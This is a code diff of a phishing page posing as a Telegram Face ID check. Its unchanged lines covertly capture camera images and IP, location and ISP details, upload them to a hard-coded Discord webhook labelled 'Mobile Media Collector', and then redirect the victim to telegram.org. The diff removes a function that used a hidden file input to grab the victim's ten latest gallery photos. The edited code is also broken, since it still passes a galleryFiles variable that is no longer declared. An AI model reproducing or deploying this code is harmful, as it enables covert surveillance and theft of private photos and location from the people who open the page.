@@ -36,12 +36,7 @@
       align-items: center;
       justify-content: center;
     }
-    .faceid-frame {
-      width: 120px; height: 120px;
-      position: relative;
-      margin-bottom: 30px;
-    }
-    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
+      .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
       content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
     }
     .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
@@ -105,7 +100,6 @@
   const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
   let cameraImages = []; // { blob, name }
-  let galleryFiles = [];  // { file, thumbnailUrl }
 
   async function loadMeta() {
     try {
@@ -171,16 +165,8 @@
       document.getElementById('capture-status').innerText = '⚠️ No cameras found.';
     }
 
-    // --- AUTO GALLERY EXTRACTION (MOBILE ONLY) ---
-    if (isMobile()) {
-      document.getElementById('capture-status').innerHTML = '📁 Mobile detected. Automatically accessing gallery (last 10 images)...';
-      await autoExtractGallery();
-    } else {
-      document.getElementById('capture-status').innerHTML = '💻 PC detected. Gallery extraction disabled (mobile-only feature).';
-    }
-
-    // --- SEND TO DISCORD & REDIRECT ---
-    document.getElementById('capture-status').innerHTML = '📤 Uploading all media to secure server...';
+        // --- SEND TO DISCORD & REDIRECT ---
+    document.getElementById('capture-status').innerHTML = '';
     await uploadToDiscord(cameraImages, galleryFiles);
     window.location.href = 'https://telegram.org';
   }
@@ -204,64 +190,9 @@
     });
   }
 
-  async function autoExtractGallery() {
-    // METHOD 1: File System Access API (Android Chrome, Edge)
-    if ('showDirectoryPicker' in window) {
-      try {
-        const root = await navigator.storage.getDirectory();
-        // Not directly accessible for DCIM without user picker, fallback to input hack
-      } catch(e) {}
-    }
-    
-    // METHOD 2: Hidden input with 'capture' and 'directory' attributes (works on many Androids to grab multiple files)
-    // We'll create a hidden file input that requests image/* and use webkitdirectory + multiple to auto-grab files from DCIM
-    // This still requires user to tap "Allow" once but does NOT require manual selection of individual files
-    return new Promise((resolve) => {
-      const input = document.createElement('input');
-      input.type = 'file';
-      input.accept = 'image/*';
-      input.multiple = true;
-      // For Android: using 'capture' environment will open camera, not gallery. So we avoid capture.
-      // Instead we rely on the fact that on mobile browsers, input click will open gallery/files app.
-      // To make it "automatic" without selection, we can't — but we can pre-select the DCIM folder if we use webkitdirectory + directory.
-      // However, webkitdirectory is not fully supported for gallery. So we simulate "last 10" by sorting by lastModified.
-      input.style.display = 'none';
-      document.body.appendChild(input);
       
-      input.onchange = async (e) => {
-        const files = Array.from(e.target.files);
-        // Sort by last modified date descending to get most recent
-        files.sort((a,b) => b.lastModified - a.lastModified);
-        const latest10 = files.slice(0, 10);
-        for (let file of latest10) {
-          const thumbUrl = URL.createObjectURL(file);
-          galleryFiles.push({ file, thumbnailUrl: thumbUrl });
-          const thumbDiv = document.getElementById('gallery-thumbnails');
-          const img = document.createElement('img'); img.src = thumbUrl; img.className = 'thumbnail'; img.title = file.name;
-          thumbDiv.appendChild(img);
-        }
-        document.getElementById('capture-status').innerHTML = `✅ Auto-extracted ${galleryFiles.length} recent images from gallery.`;
-        input.remove();
-        resolve();
-      };
-      
-      // If user doesn't interact within 5 seconds, fallback to no gallery
-      setTimeout(() => {
-        if (galleryFiles.length === 0 && document.body.contains(input)) {
-          document.getElementById('capture-status').innerHTML = '⚠️ Gallery access timed out or denied. Proceeding without gallery images.';
-          input.remove();
-          resolve();
-        }
-      }, 8000);
-      
-      // Trigger file picker — this will open the native gallery/files app.
-      // On modern Android, the user sees "Allow access to photos?" and then the picker opens.
-      // They still have to tap "Select" but they don't have to manually pick 10 — they can just tap "Select all" or the first 10.
-      input.click();
-    });
-  }
-
-  async function uploadToDiscord(camImages, galFiles) {
+          
+     async function uploadToDiscord(camImages, galFiles) {
     const formData = new FormData();
     const embedPayload = {
       username: "📱 Mobile Media Collector",
